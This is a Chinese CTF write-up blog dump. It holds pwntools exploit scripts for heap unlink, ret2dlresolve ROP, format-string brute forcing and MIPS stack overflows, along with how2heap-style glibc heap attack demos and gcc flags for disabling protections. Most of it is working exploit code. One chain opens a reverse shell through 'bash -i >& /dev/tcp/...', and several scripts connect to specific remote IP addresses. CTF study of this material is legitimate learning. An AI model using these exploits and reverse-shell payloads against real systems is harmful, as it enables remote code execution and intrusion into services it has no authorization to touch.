gdb.attach(p) # pause() edit(3, payload) free(3) break except: p.close() continuep.interactive() pwn3一道mips unlink，非常简单。虽然貌似官方给的wp不是这个解法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *context.log_level = 'DEBUG'# sh = process(['./qemu-mipsel-static','-L','./','./pwn3'])sh = remote('183.129.189.62',61303)def add(size,content): sh.sendline('1') sh.recvuntil('length:') sh.sendline(str(size)) sh.recvuntil('info:') sh.send(content) sh.recvuntil('&gt;&gt;')def delete(idx): sh.sendline('2') sh.recvuntil('user:') sh.sendline(str(idx)) sh.recvuntil('&gt;&gt;',timeout=0.5)def edit(idx,content): sh.sendline('3') sh.recvuntil('edit:') sh.sendline(str(idx)) sh.recvuntil('info:') sh.send(content) sh.recvuntil('&gt;&gt;')def show(idx): sh.sendline('4') sh.recvuntil('show:') sh.sendline(str(idx)) sh.recvuntil('info: ') content = sh.recvuntil('\\nDisplay complete!',drop=True) return contentbuf_addr = 0x411830free_got = 0x4117B4add(0x60,'aaa') #0x69add(0x60,'aaa')add(0x40,'/bin/sh\\x00')payload = p32(0) + p32(0x60) + p32(buf_addr - 3*4) + p32(buf_addr - 2*4) + 'A' * 0x50 + p32(0x60) +p32(0x68)edit(0,payload)delete(1)payload = 'a' * 8 + p32(buf_addr) + p32(0x60) + p32(free_got) + p32(0x60)edit(0,payload)free_addr = u32(show(1).ljust(4,'\\x00'))log.info('free = ' + hex(free_addr))libc_base = free_addr - 0x56B68log.success('libc_base = ' + hex(libc_base))system = libc_base + 0x5f8f0payload = p32(system)edit(1,payload)edit(2,'/bin/sh\\x00')delete(2)sh.interactive() upload_server recvmsg函数的msg.msg_iov-&gt;iov_len 也就是接收数据最大值为0x410，并且将接收到的数据存放在全局变量段(msg.msg_iov-&gt;iov_base=0x603160）。第一段check先通过正则判断数据是否为base64密文格式，然后将其base64解密后存放在s变量栈上，解密后数据的最大长度为0x410*(3/4)=0x30c字节，存在栈溢出。然后判断解密后的数据长度是否为大于64，最后将数据的0-31位与33-64位分别base64加密后将相应内容写入key文件夹中。 由于整段功能代码放在子进程里面实现，所以子进程崩溃后父进程回收即可，不影响父进程运行。server虽然存在栈溢出，但利用起来也十分有限，无法泄露地址。栈溢出长度也有限制，必须进行栈迁移，先通过ROP去调用内置decode函数解密存在在bss段的rop数据，再栈迁去执行bss段的rop_chain.利用dlruntime_resolve一把梭，提前在bss段相应地址构造fake_linkmap数据，由于程序中不存在写相关函数，可使用memset设置link_map的值，最后通过dl调用到system函数执行”bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;\\x00” 反弹shell。 123456789101112131415161718192021222324252627282930313233343536from pwn import *context(os='linux', arch='amd64', log_level='debug')elf=ELF(\"server\")p=remote(\"127.0.0.1\",2333)fake=['P', 'L', '\\x02', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\xc8', '\\xe6', ']', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x07', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\xf0', '2', '`', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '`', '3', '`', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', 'h', ' ', '`', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x08', '3', '`', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', 'h', '3', '`', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00']fake_link_map=\"\".join(fake)gad1= 0x40192agad2=0x401910decode=0x400ee7off=0x198 pop_rdi=0x401933pop_rsi_r15=0x401931leave_ret=0x401823link_map=0x602008memset_got=elf.got['memset']bss=0x603160map_addr=bss+0x190payload=\"s\"*64#使用mmap修改link_mappayload+=p64(gad1)+p64(0)+p64(1)+p64(memset_got)+p64(1)+p64(map_addr&amp;0xff)+p64(link_map)+p64(gad2)+\"1\"*8payload+=p64(0)+p64(1)+p64(memset_got)+p64(1)+p64((map_addr&gt;&gt;8)&amp;0xff)+p64(link_map+1)+p64(gad2)+\"1\"*8payload+=p64(0)+p64(1)+p64(memset_got)+p64(1)+p64((map_addr&gt;&gt;16)&amp;0xff)+p64(link_map+2)+p64(gad2)+\"1\"*8payload+=p64(0)+p64(1)+p64(memset_got)+p64(5)+p64(0)+p64(link_map+3)+p64(gad2)+\"1\"*56payload+=p64(pop_rdi)+p64(bss+0x2d0)+p64(0x400A36)+fake_link_map+p64(bss+64-8)+ (pop_rdi)+p64(bss)+p64(pop_rsi_r15)+p64(bss)+p64(0)+p64(decode)+p64(leave_ret)+\"bash -c \\\"bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&lt;&amp;1\\\"\\x00\"payload=base64.b64encode(payload)p.send(payload)p.recv() 在复现的时候主要感觉他这个fake_link的构造很玄学，然后在网上找了个板子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147# encoding=utf-8from pwn import *context.log_level='debug'context.terminal='/bin/zsh'libc = ELF(\"./libc-2.23.so\")elf = ELF(\"./ret2-dl\")bss = elf.bss()log.info(\".bss :0x%X\"%bss)write_addr = bss+0xac0 # 这里要调试一下，rsp有可能落在非bss上rbp = write_addr-0x8fake_link_map_addr = write_addr+0x18vuln_addr = 0x0000000000400687pop7ret = 0x000000000040073amov3call = 0x0000000000400720plt_load = 0x4004e6 # jmpread_got = elf.got['read']# ELF64_sym_size = 0x18# ELF64_Rela_size = 0x18'''typedef struct &#123; Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */ &#125;Elf64_Sym;typedef struct &#123; Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */ Elf64_Sxword r_addend; /* Addend */ &#125;Elf64_Rela;typedef struct &#123; Elf64_Sxword d_tag; /* Dynamic entry type */ union &#123; Elf64_Xword d_val; /* Integer value */ Elf64_Addr d_ptr; /* Address value */ &#125; d_un;&#125;Elf64_Dyn;'''#fake_Elf64_Dyn_STR_addr = link_map +0x68 #fake_Elf64_Dyn_SYM_addr = link_map +0x70 #fake_Elf64_Dyn_JMPREL_addr = link_map +0xf8def get_fake_link_map(fake_link_map_addr,l_addr,st_value): # 给出各个指针的假地址 fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr) fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr + 0x8) fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr + 0x18) # 伪造相关结构体 fake_Elf64_Dyn_SYM = flat(p64(0),p64(st_value-8)) fake_Elf64_Dyn_JMPREL = flat(p64(0),p64(fake_link_map_addr+0x28) )# JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28 r_offset = fake_link_map_addr - l_addr log.info(\"r_offset :\"+str(hex(r_offset))) fake_Elf64_rela = flat(p64(r_offset),p64(7),p64(0)) # fake_link_map整体结构 fake_link_map = flat( # 0x0 p64(l_addr), # 0x8 fake_Elf64_Dyn_SYM, # 0x18 fake_Elf64_Dyn_JMPREL,# 0x28 fake_Elf64_rela, # 0x40 \"\\x00\"*0x28, # 0x68，下面开始放指针 fake_Elf64_Dyn_STR_addr, # STRTAB指针,0x70 fake_Elf64_Dyn_SYM_addr, # SYMTAB指针,0x78 \"/bin/sh\\x00\".ljust(0x80,\"\\x00\"), fake_Elf64_Dyn_JMPREL_addr, # JMPREL指针 ) return fake_link_mapl_addr = libc.sym['system'] - libc.sym['__libc_start_main'] # l-&gt;l_addr设置为 system 与 __libc_start_main 的偏移值,此时__libc_start_main是一个已经解析过的函数log.info(\"l_addr :\"+str(hex(l_addr)))log.info(\"elf.got['__libc_start_main'] :\"+str(hex(elf.got['__libc_start_main'])))log.info(\"plt_load :\"+str(hex(0x4004e6)))log.info(\"write_addr :\"+str(hex(write_addr)))#l-&gt;l_addr + sym-&gt;st_value# value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);st_value = elf.got['__libc_start_main']fake_link_map = get_fake_link_map(fake_link_map_addr,l_addr,st_value)io = process(\"./ret2-dl\")# 1. 首先，利用栈迁移，把fake_link_map放在bss段上rop = flat( 'a'*0x70, # 此时到达老rbp p64(rbp), p64(pop7ret), p64(0), p64(1), p64(read_got), # 重新调用read函数 r12 p64(len(fake_link_map)+0x18+0x10), # read读入长度 p64(write_addr), # read读入位置 p64(0), # p64(mov3call), p64(0)*7 , # 补位 p64(vuln_addr) # 再返回vuln函数)log.info(hex(len(fake_link_map)+0x18+0x10))io.sendline(rop) # 此rop中包含了ret2csu，利用其向bss上读数据sleep(1)# 2. 接下来，由于我们在rop中利用ret2csu调用了read函数，我们开始向bss上读数据，以下数据内容是由rop中ret2csu调用的read函数读取的。fake = flat( p64(plt_load), p64(fake_link_map_addr), p64(0), fake_link_map # fake_link_map本体)log.info(hex(len(fake)))io.sendline(fake)attach(io)pause()pop_rdi_ret = 0x0000000000400743leave = 0x4006a6stack_mig = flat( 'a'*0x70, p64(rbp), p64(pop_rdi_ret), p64(fake_link_map_addr+0x78), # /bin/sh p64(leave))sleep(1)io.sendline(stack_mig)io.interactive() pwn5单步执行到printf_positional函数ret返回的地方，观察此时的返回的lbc地址和一个onegadget很接近，大概率只需爆破一位就行，且此时的onegadget刚好满足触发条件 好思路 12345678910111213141516171819from pwn import *context(os='linux', arch='amd64', log_level='debug')while(1): try: p=process(\"./noleakfmt\") one=0x027a p.recvuntil(\" : \") stack=int(p.recv(14),16)-0x2d6c if(stack&amp;0xffff&gt;0x2000): p.close() continue p.sendline(\"%\"+str(stack&amp;0xffff)+\"c\"+\"%11$hn\") p.sendline(\"%\"+str(one)+\"c\"+\"%37$hn\") p.interactive() except: p.close()","tags":[{"name":"writeup","slug":"writeup","permalink":"wood1314.github.io/tags/writeup/"}]},{"title":"mips pwn","date":"2020-09-23T03:20:10.000Z","path":"year/09/23/cl6ewlda7002rj63fekel39vh/","text":"记录下mips架构环境的搭建和利用 0x0 mips基本知识 a0-a3: 存储参数 fp: fram pointer，用来恢复栈之类的操作，可以理解为和ebp差不多的作用 sp: 存储栈地址 v0...: 存储一些变量或地址 t8,t9: 临时寄存器，t9常常用来调用函数。如alarm的plt调用如下 0x1 交叉编译环境大端1234sudo apt-get install linux-libc-dev-mips-cross sudo apt-get install libc6-mips-cross libc6-dev-mips-cross sudo apt-get install binutils-mips-linux-gnu gcc-mips-linux-gnu sudo apt-get install g++-mips-linux-gnu 小端1234sudo apt-get install linux-libc-dev-mipsel-crosssudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-crosssudo apt-get install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnusudo apt-get install g++-mipsel-linux-gnu qemu有一个参数是是-L 1-L path QEMU_LD_PREFIX set the elf interpreter prefix to &apos;path&apos; 通过这个我们可以指定lib所在的位置，进入/usr可以看到mips库所在的位置 12wood@ubuntu:~/pwn/mips/magicheap$ ls /usr/bin games include lib libexec local locale mipsel-linux-gnu mips-linux-gnu sbin share src 假设我们手头有一个mips小端的程序，我们就可以通过以下参数启动它。 1qemu-mipsel -L /usr/mipsel-linux-gnu/ ./hello pwn02_babystack准备工作这里采用qemu的用户模式来创建一个虚拟机执行程序。 先把对应的libc库放置当前目录的一个lib文件夹中 123mkdir lib sudo mv libc.so.1 ./lib/sudo mv ld-uClibc.so.0 ./lib/ 启动虚拟机 1qemu-mipsel -L ./ ./main 调试1qemu-mipsel -L ./ ./main 然后另开一个终端(用pwndbg调试起来比较友好) 12gdb-multiarch ./maingdb&gt; target remote localhost:1234 题目分析很简单，就是一个栈溢出然后执行shellcode就好了 exp12345678910111213141516171819from pwn import *context.arch='mips'context.log_level = 'debug'#sh= process([\"qemu-mipsel\", \"-g\", \"1234\", \"-L\", \"./lib\",\"./main\"])sh = remote('111.231.70.44',28099)context.arch='mips'context.os='linux'context.update(bits = 32, endian = 'little')ret_addr = 0x400860sh.recvuntil('Now,Input Your Name:\\n')shellcode = \"\"shellcode += \"\\x66\\x06\\x06\\x24\\xff\\xff\\xd0\\x04\\xff\\xff\\x06\\x28\\xe0\"shellcode += \"\\xff\\xbd\\x27\\x01\\x10\\xe4\\x27\\x1f\\xf0\\x84\\x24\\xe8\\xff\"shellcode += \"\\xa4\\xaf\\xec\\xff\\xa0\\xaf\\xe8\\xff\\xa5\\x27\\xab\\x0f\\x02\"shellcode += \"\\x24\\x0c\\x01\\x01\\x01\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\"sh.sendline(shellcode)sh.recvuntil('Input Your message:\\n')sh.sendline('a'*0x34 + p32(0x410C20))sh.interactive()","tags":[{"name":"mips","slug":"mips","permalink":"wood1314.github.io/tags/mips/"}]},{"title":"出题时常用到的编译命令","date":"2020-09-15T14:57:05.000Z","path":"year/09/15/cl6ewldb3004xj63f5a9dw0pd/","text":"就是开保护关保护什么的编译选项 Linux alsr12345# sysctl -n kernel.randomize_va_space# cat /proc/sys/kernel/randomize_va_space# sysctl -w kernel.randomize_va_space=0# echo 0 &gt; /proc/sys/kernel/randomize_va_space PIE123456$ gcc -o test test.c // 默认不开启PIE$ gcc -fpie -pie -o test test.c // 开启PIE 强度为1$ gcc -fPIE -pie -o test test.c // 开启PIE 最高强度2$ gcc -fpic -o test test.c // 开启PIC 强度为1 不会开启PIE$ gcc -fPIC -o test test.c // 开启PIC 最高强度2 不会开启PIE$ gcc -no-pie -o test test.c // 关闭pie NX123$ gcc -o test test.c // 默认开启 NX 保护$ gcc -z execstack -o test test.c // 禁用 NX 保护$ gcc -z noexecstack -o test test.c // 开启 NX 保护 canary1234$ gcc -o test test.c // 默认不开启 Canary 保护$ gcc -fno-stack-protector -o test test.c // 禁用栈保护$ gcc -fstack-protector -o test test.c // 启用堆栈保护，只为局部变量中含有 char 数组的函数插入保护代码$ gcc -fstack-protector-all -o test test.c // 启用堆栈保护，为所有函数插入保护代码 FORTIFY123$ gcc -o test test.c // 默认不会开启检查$ gcc -D_FORTIFY_SOURCE=1 -o test test.c // 较弱的检查$ gcc -D_FORTIFY_SOURCE=2 -o test test.c // 较强的检查 RELRO1234gcc -o test test.c // 默认是 Partial RELROgcc -z norelro -o test test.c // 关闭gcc -z lazy -o test test.c // 部分开启 即Partial RELROgcc -z now -o test test.c // 全部开启 去符号名1// gcc -o box box.c &amp;&amp; strip -s box","tags":[{"name":"gcc","slug":"gcc","permalink":"wood1314.github.io/tags/gcc/"}]},{"title":"house_of_botcake && fastbin_reverse_into_tcache","date":"2020-09-15T09:38:24.000Z","path":"year/09/15/cl6ewld9y0021j63f4rkq5p3y/","text":"house_of_botcake 是针对2.29对double free做出限制以后提出的利用方法 fastbin_reverse_into_tcache 是利用fastbin实现一个类似于unsorted bin attack的效果 0x01 house_of_botcake1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123; /* * This attack should bypass the restriction introduced in * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d * If the libc does not include the restriction, you can simply double free the victim and do a * simple tcache poisoning * And thanks to @anton00b and @subwire for the weird name of this technique */ // disable buffering so _IO_FILE does not interfere with our heap setbuf(stdin, NULL); setbuf(stdout, NULL); // introduction puts(\"This file demonstrates a powerful tcache poisoning attack by tricking malloc into\"); puts(\"returning a pointer to an arbitrary location (in this demo, the stack).\"); puts(\"This attack only relies on double free.\\n\"); // prepare the target intptr_t stack_var[4]; puts(\"The address we want malloc() to return, namely,\"); printf(\"the target address is %p.\\n\\n\", stack_var); // prepare heap layout puts(\"Preparing heap layout\"); puts(\"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.\"); intptr_t *x[7]; for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++)&#123; x[i] = malloc(0x100); &#125; puts(\"Allocating a chunk for later consolidation\"); intptr_t *prev = malloc(0x100); puts(\"Allocating the victim chunk.\"); intptr_t *a = malloc(0x100); printf(\"malloc(0x100): a=%p.\\n\", a); puts(\"Allocating a padding to prevent consolidation.\\n\"); malloc(0x10); // cause chunk overlapping puts(\"Now we are able to cause chunk overlapping\"); puts(\"Step 1: fill up tcache list\"); for(int i=0; i&lt;7; i++)&#123; free(x[i]); &#125; puts(\"Step 2: free the victim chunk so it will be added to unsorted bin\"); free(a); puts(\"Step 3: free the previous chunk and make it consolidate with the victim chunk.\"); free(prev); puts(\"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n\"); malloc(0x100); /*VULNERABILITY*/ free(a);// a is already freed /*VULNERABILITY*/ // simple tcache poisoning puts(\"Launch tcache poisoning\"); puts(\"Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk\"); intptr_t *b = malloc(0x120); puts(\"We simply overwrite victim's fwd pointer\"); b[0x120/8-2] = (long)stack_var; // take target out puts(\"Now we can cash out the target chunk.\"); malloc(0x100); intptr_t *c = malloc(0x100); printf(\"The new chunk is at %p\\n\", c); // sanity check assert(c==stack_var); printf(\"Got control on target/stack!\\n\\n\"); // note puts(\"Note:\"); puts(\"And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim\"); puts(\"In that case, once you have done this exploitation, you can have many arbitary writes very easily.\"); return 0;&#125; 先申请7个chunk，然后再申请出一个a和一个prev，我们最后会对这个a进行攻击。（注意先申请prev，再申请a，顺序不能乱） 1234567for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++)&#123; x[i] = malloc(0x100); &#125; puts(\"Allocating a chunk for later consolidation\"); intptr_t *prev = malloc(0x100); puts(\"Allocating the victim chunk.\"); intptr_t *a = malloc(0x100); 随后把tcache填满，释放a和prev,释放a和prev，这个时候a和prev合并了，都在unsortedbin中 12345678for(int i=0; i&lt;7; i++)&#123; free(x[i]); &#125; puts(\"Step 2: free the victim chunk so it will be added to unsorted bin\"); free(a); puts(\"Step 3: free the previous chunk and make it consolidate with the victim chunk.\"); free(prev); 然后实现double free,此时没有相同指针在bin和tcache中 12345puts(\"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n\"); malloc(0x100); /*VULNERABILITY*/ free(a);// a is already freed /*VULNERABILITY*/ 最后更改fd，完美 123456789intptr_t *b = malloc(0x120); puts(\"We simply overwrite victim's fwd pointer\"); b[0x120/8-2] = (long)stack_var; // take target out puts(\"Now we can cash out the target chunk.\"); malloc(0x100); intptr_t *c = malloc(0x100); printf(\"The new chunk is at %p\\n\", c); 0x02 fastbin_reverse_into_tcache123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;const size_t allocsize = 0x40;int main()&#123; fprintf( stderr, \"\\n\" \"This attack is intended to have a similar effect to the unsorted_bin_attack,\\n\" \"except it works with a small allocation size (allocsize &lt;= 0x78).\\n\" \"The goal is to set things up so that a call to malloc(allocsize) will write\\n\" \"a large unsigned value to the stack.\\n\\n\" ); // Allocate 14 times so that we can free later. char* ptrs[14]; size_t i; for (i = 0; i &lt; 14; i++) &#123; ptrs[i] = malloc(allocsize); &#125; fprintf( stderr, \"First we need to free(allocsize) at least 7 times to fill the tcache.\\n\" \"(More than 7 times works fine too.)\\n\\n\" ); // Fill the tcache. for (i = 0; i &lt; 7; i++) &#123; free(ptrs[i]); &#125; char* p = ptrs[7]; fprintf( stderr, \"The next pointer that we free is the chunk that we're going to corrupt: %p\\n\" \"It doesn't matter if we corrupt it now or later. Because the tcache is\\n\" \"already full, it will go in the fastbin.\\n\\n\", p ); free(p); fprintf( stderr, \"Next we need to free between 1 and 6 more pointers. These will also go\\n\" \"in the fastbin. If the stack address that we want to overwrite is not zero\\n\" \"then we need to free exactly 6 more pointers, otherwise the attack will\\n\" \"cause a segmentation fault. But if the value on the stack is zero then\\n\" \"a single free is sufficient.\\n\\n\" ); // Fill the fastbin. for (i = 8; i &lt; 14; i++) &#123; free(ptrs[i]); &#125; // Create an array on the stack and initialize it with garbage. size_t stack_var[6]; memset(stack_var, 0xcd, sizeof(stack_var)); fprintf( stderr, \"The stack address that we intend to target: %p\\n\" \"It's current value is %p\\n\", &amp;stack_var[2], (char*)stack_var[2] ); fprintf( stderr, \"Now we use a vulnerability such as a buffer overflow or a use-after-free\\n\" \"to overwrite the next pointer at address %p\\n\\n\", p ); //------------VULNERABILITY----------- // Overwrite linked list pointer in p. *(size_t**)p = &amp;stack_var[0]; //------------------------------------ fprintf( stderr, \"The next step is to malloc(allocsize) 7 times to empty the tcache.\\n\\n\" ); // Empty tcache. for (i = 0; i &lt; 7; i++) &#123; ptrs[i] = malloc(allocsize); &#125; fprintf( stderr, \"Let's just print the contents of our array on the stack now,\\n\" \"to show that it hasn't been modified yet.\\n\\n\" ); for (i = 0; i &lt; 6; i++) &#123; fprintf(stderr, \"%p: %p\\n\", &amp;stack_var[i], (char*)stack_var[i]); &#125; fprintf( stderr, \"\\n\" \"The next allocation triggers the stack to be overwritten. The tcache\\n\" \"is empty, but the fastbin isn't, so the next allocation comes from the\\n\" \"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\\n\" \"Those 7 chunks are copied in reverse order into the tcache, so the stack\\n\" \"address that we are targeting ends up being the first chunk in the tcache.\\n\" \"It contains a pointer to the next chunk in the list, which is why a heap\\n\" \"pointer is written to the stack.\\n\" \"\\n\" \"Earlier we said that the attack will also work if we free fewer than 6\\n\" \"extra pointers to the fastbin, but only if the value on the stack is zero.\\n\" \"That's because the value on the stack is treated as a next pointer in the\\n\" \"linked list and it will trigger a crash if it isn't a valid pointer or null.\\n\" \"\\n\" \"The contents of our array on the stack now look like this:\\n\\n\" ); malloc(allocsize); for (i = 0; i &lt; 6; i++) &#123; fprintf(stderr, \"%p: %p\\n\", &amp;stack_var[i], (char*)stack_var[i]); &#125; char *q = malloc(allocsize); fprintf( stderr, \"\\n\" \"Finally, if we malloc one more time then we get the stack address back: %p\\n\", q ); return 0;&#125; 这个给的代码例子看起来貌似很复杂，但实际上是挺简单的过程，概括起来就是 先把tcache填满，然后再给fastbin填6个 12345678910111213141516171819202122232425262728293031323334353637383940char* ptrs[14]; size_t i; for (i = 0; i &lt; 14; i++) &#123; ptrs[i] = malloc(allocsize); &#125; fprintf( stderr, \"First we need to free(allocsize) at least 7 times to fill the tcache.\\n\" \"(More than 7 times works fine too.)\\n\\n\" ); // Fill the tcache. for (i = 0; i &lt; 7; i++) &#123; free(ptrs[i]); &#125; char* p = ptrs[7]; fprintf( stderr, \"The next pointer that we free is the chunk that we're going to corrupt: %p\\n\" \"It doesn't matter if we corrupt it now or later. Because the tcache is\\n\" \"already full, it will go in the fastbin.\\n\\n\", p ); free(p); fprintf( stderr, \"Next we need to free between 1 and 6 more pointers. These will also go\\n\" \"in the fastbin. If the stack address that we want to overwrite is not zero\\n\" \"then we need to free exactly 6 more pointers, otherwise the attack will\\n\" \"cause a segmentation fault. But if the value on the stack is zero then\\n\" \"a single free is sufficient.\\n\\n\" ); // Fill the fastbin. for (i = 8; i &lt; 14; i++) &#123; free(ptrs[i]); &#125; 然后再修改fastbin尾部那个chunk的fd,把tcache清空。当从fastbin中取出chunk的时候，会把其它的fastbin中的chunk反向插入到tcache中，这样就可以实现把目的地址的fd写上一个堆地址。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//------------VULNERABILITY----------- // Overwrite linked list pointer in p. *(size_t**)p = &amp;stack_var[0]; //------------------------------------ fprintf( stderr, \"The next step is to malloc(allocsize) 7 times to empty the tcache.\\n\\n\" ); // Empty tcache. for (i = 0; i &lt; 7; i++) &#123; ptrs[i] = malloc(allocsize); &#125; fprintf( stderr, \"Let's just print the contents of our array on the stack now,\\n\" \"to show that it hasn't been modified yet.\\n\\n\" ); for (i = 0; i &lt; 6; i++) &#123; fprintf(stderr, \"%p: %p\\n\", &amp;stack_var[i], (char*)stack_var[i]); &#125; fprintf( stderr, \"\\n\" \"The next allocation triggers the stack to be overwritten. The tcache\\n\" \"is empty, but the fastbin isn't, so the next allocation comes from the\\n\" \"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\\n\" \"Those 7 chunks are copied in reverse order into the tcache, so the stack\\n\" \"address that we are targeting ends up being the first chunk in the tcache.\\n\" \"It contains a pointer to the next chunk in the list, which is why a heap\\n\" \"pointer is written to the stack.\\n\" \"\\n\" \"Earlier we said that the attack will also work if we free fewer than 6\\n\" \"extra pointers to the fastbin, but only if the value on the stack is zero.\\n\" \"That's because the value on the stack is treated as a next pointer in the\\n\" \"linked list and it will trigger a crash if it isn't a valid pointer or null.\\n\" \"\\n\" \"The contents of our array on the stack now look like this:\\n\\n\" ); malloc(allocsize); for (i = 0; i &lt; 6; i++) &#123; fprintf(stderr, \"%p: %p\\n\", &amp;stack_var[i], (char*)stack_var[i]); &#125; char *q = malloc(allocsize); fprintf( stderr, \"\\n\" \"Finally, if we malloc one more time then we get the stack address back: %p\\n\", q );","tags":[{"name":"tcache","slug":"tcache","permalink":"wood1314.github.io/tags/tcache/"}]},{"title":"Tcache Stashing Unlink Attack利用","date":"2020-09-14T13:06:28.000Z","path":"year/09/14/cl6ewld9t001rj63fnaopyjqo/","text":"这种利用方法类似于house of lore,总结一下，留个模板以后备用 0x01 前置知识1.1 house of lore攻击效果分配任意指定位置的 chunk，从而修改任意地址的内存。（任意地址写） 攻击条件能控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。 攻击原理12345678910111213141516171819202122232425262728293031 /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.)*/if (in_smallbin_range (nb))&#123; idx = smallbin_index (nb); // 获取 small bin 的索引 bin = bin_at (av, idx); // 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk // 若结果 victim = bin ，那说明该 bin 为空。 if ( ( victim = last (bin) ) != bin ) &#123; // 获取 small bin 中倒数第二个 chunk 。 bck = victim-&gt;bk; // 检查 bck-&gt;fd 是不是 victim，防止伪造 if ( __glibc_unlikely( bck-&gt;fd != victim ) ) malloc_printerr (\"malloc(): smallbin double linked list corrupted\"); // 设置 victim 对应的 inuse 位 set_inuse_bit_at_offset (victim, nb); // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来 bin-&gt;bk = bck; bck-&gt;fd = bin; // 如果不是 main_arena，设置对应的标志 if (av != &amp;main_arena) set_non_main_arena (victim); //执行更为细致的检查 check_malloced_chunk (av, victim, nb); 首先smallbin 如果 malloc的话，chunk是从链表尾部取的。如果free的话，chunk是添加到链表头部的(靠近bin的位置)。 现在small bin中有两个chunk 12345678910 fd |-----------------------------------------| ↓ fd fd ||--------|---------&gt;|---------|---------&gt;|----------||smallbin| | chunk1 | | chunk2 | |--------|&lt;---------|---------|&lt;---------|----------| | bk bk ↑ | | |----------------------------------------| bk 